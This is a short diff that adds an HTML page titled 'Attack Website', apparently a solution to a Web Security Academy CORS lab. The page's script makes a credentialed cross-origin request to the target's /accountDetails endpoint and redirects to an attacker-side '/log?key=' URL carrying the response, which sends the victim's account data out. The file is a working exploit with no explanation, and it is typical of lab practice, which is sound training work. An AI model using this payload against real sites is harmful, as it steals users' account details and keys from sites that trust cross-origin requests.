@@ -1,0 +1,22 @@
+<html>
+    <body>
+        <h1>Attack Website</h1>
+
+        <script>
+
+            let req = new XMLHttpRequest()
+
+            req.open("get", "https://0ad70036037c866181142fa600f9003d.web-security-academy.net/accountDetails", true)
+
+            req.onload = () => {
+
+                window.location.href = "/log?key=" + req.responseText
+            }
+
+            req.withCredentials = true
+
+            req.send()
+
+        </script>
+    </body>
+</html>
